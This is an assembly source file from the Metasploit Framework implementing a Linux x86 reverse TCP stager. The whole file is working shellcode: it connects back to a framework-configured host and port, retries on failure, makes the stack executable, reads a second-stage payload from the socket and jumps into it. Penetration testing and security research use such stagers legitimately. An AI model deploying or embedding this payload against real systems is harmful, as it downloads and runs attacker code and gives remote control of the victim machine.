;;
;
;        Name: stager_sock_reverse
;   Qualities: Can Have Nulls
;     Version: $Revision: 1512 $
;     License:
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        Implementation of a Linux reverse TCP stager.
;
;        File descriptor in edi.
;
; Meta-Information:
;
; meta-shortname=Linux Reverse TCP Stager
; meta-description=Connect back to the framework and run a second stage
; meta-authors=skape <mmiller [at] hick.org>
; meta-os=linux
; meta-arch=ia32
; meta-category=stager
; meta-connection-type=reverse
; meta-name=reverse_tcp
; meta-basemod=Msf::PayloadComponent::ReverseConnection
; meta-offset-lhost=0x12
; meta-offset-lport=0x19
;;
BITS   32
GLOBAL _start

_start:
	push 0x5              ; retry counter
	pop esi

create_socket:
	xor  ebx, ebx
	mul  ebx
	; int socket(int domain, int type, int protocol);
	push ebx              ; protocol = 0 = first that matches this type and domain, i.e. tcp
	inc  ebx              ; 1 = SYS_SOCKET
	push ebx              ; type     = 1 = SOCK_STREAM
	push byte 0x2         ; domain   = 2 = AF_INET
	mov  al, 0x66         ; __NR_socketcall
	mov  ecx, esp         ; socketcall args
	int  0x80
	xchg eax, edi

set_address:
	pop ebx                    ; set ebx back to zero
	push dword 0x0100007f ; addr->sin_addr = 127.0.0.1
	push 0xbfbf0002       ; addr->sin_port = 49087
	                      ; addr->sin_family = 2 = AF_INET
	mov  ecx, esp         ; ecx = addr

; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
try_connect:
	push byte 0x66        ; __NR_socketcall
	pop  eax
	push eax              ; addrlen
	push ecx              ; addr
	push edi              ; sockfd
	mov  ecx, esp         ; socketcall args
	inc  ebx              ; 3 = SYS_CONNECT
	int  0x80
	test eax, eax
	jns mprotect

handle_failure:
	push 0xa2
	pop eax
	push 0x0              ; sleep_nanoseconds
	push 0x5              ; sleep_seconds
	mov ebx, esp
	xor ecx, ecx
	int 0x80              ; sys_nanosleep
	test eax, eax
	js failed
	dec esi
	jnz create_socket
	jmp failed

%ifndef USE_SINGLE_STAGE

; int mprotect(const void *addr, size_t len, int prot);
mprotect:
	mov  dl, 0x7          ; prot = 7 = PROT_READ | PROT_WRITE | PROT_EXEC
	mov  ecx, 0x1000      ; len  = PAGE_SIZE (on most systems)
	mov  ebx, esp         ; addr
	shr  ebx, 12          ; ensure that addr is page-aligned
	shl  ebx, 12
	mov  al, 0x7d         ; __NR_mprotect
	int  0x80
	test eax, eax
	js failed

; ssize_t read(int fd, void *buf, size_t count);
recv:
	pop  ebx              ; sockfd
	mov  ecx, esp         ; buf
	cdq
	mov  dh, 0xc          ; count = 0xc00
	mov  al, 0x3          ; __NR_read
	int  0x80
	test eax, eax
	js failed
	jmp  ecx

failed:
	mov eax, 0x1
	mov ebx, 0x1          ; set exit status to 1
	int 0x80              ; sys_exit

%endif
